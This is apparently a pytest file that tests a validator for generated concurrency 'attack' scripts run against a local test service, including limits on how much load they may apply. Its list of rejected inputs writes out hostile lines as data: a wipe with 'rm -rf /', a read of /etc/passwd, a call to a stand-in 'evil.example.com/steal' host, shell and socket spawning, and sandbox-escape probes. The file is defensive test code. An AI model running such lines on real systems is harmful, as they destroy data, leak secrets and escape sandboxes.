"""Attack validator: the reference attack passes; every unsafe pattern is rejected (PLAN §11.4)."""

import pytest

from crucible.contracts.defense import AttackFunctions
from crucible.defense.attack_writer import clamp_load, render_attack
from crucible.defense.validator import AttackRejected, validate_functions

OK_SETUP = 'r = await client.post(f"{BASE}/reset")\nreturn {"n": 1}'
OK_REQ = 'return await client.post(f"{BASE}/transfer", json={"i": i})'
OK_INV = 'total = (await client.get(f"{BASE}/total")).json()["total"]\nreturn total == 1, 0, "ok"'


def fn(setup=OK_SETUP, req=OK_REQ, inv=OK_INV) -> AttackFunctions:
    return AttackFunctions(setup_body=setup, request_body=req, invariant_body=inv, rationale="test")


def test_reference_attack_passes(bank):
    validate_functions(bank.reference_attack.functions)


def test_valid_bodies_render_and_compile():
    script = render_attack(fn(), port=8123, concurrency=5, duration_s=2)
    assert 'BASE = "http://127.0.0.1:8123"' in script
    assert "CONCURRENCY = 5" in script


@pytest.mark.parametrize(
    "bad_request",
    [
        "import os\nreturn await client.get(BASE)",
        "from subprocess import run\nreturn await client.get(BASE)",
        "open('/etc/passwd')\nreturn await client.get(BASE)",
        "eval('1')\nreturn await client.get(BASE)",
        "__import__('os')\nreturn await client.get(BASE)",
        "x = client.__class__.__mro__\nreturn await client.get(BASE)",
        "getattr(client, 'get')\nreturn await client.get(BASE)",
        'return await client.get("https://evil.example.com/steal")',
        "global BASE\nreturn await client.get(BASE)",
        "BASE = 'x'\nreturn await client.get(BASE)",
        "os.system('rm -rf /')\nreturn await client.get(BASE)",
        "return await client.get(BASE",
        # Srinithin's probes (PR #15 review): a shell, a raw socket, a thread, the event loop
        'await asyncio.create_subprocess_shell("id")\nreturn await client.get(BASE)',
        'r, w = await asyncio.open_connection("example.com", 80)\nreturn await client.get(BASE)',
        "await asyncio.to_thread(print, 1)\nreturn await client.get(BASE)",
        "loop = asyncio.get_running_loop()\nreturn await client.get(BASE)",
        "x = asyncio.get_event_loop().run_in_executor(None, print)\nreturn await client.get(BASE)",
        # its own client would skip the template's loopback hook; private attributes reach the transport
        "c = httpx.AsyncClient()\nreturn await c.get(BASE)",
        "t = client._transport\nreturn await client.get(BASE)",
        "   ",
    ],
)
def test_unsafe_bodies_are_rejected(bad_request):
    with pytest.raises(AttackRejected):
        validate_functions(fn(req=bad_request))


def test_load_is_clamped_to_plan_limits():
    assert clamp_load(10_000, 600) == (200, 30)
    assert clamp_load(0, 0) == (1, 1)
    script = render_attack(fn(), port=1, concurrency=999, duration_s=999)
    assert "CONCURRENCY = 200" in script and "DURATION_S = 30" in script
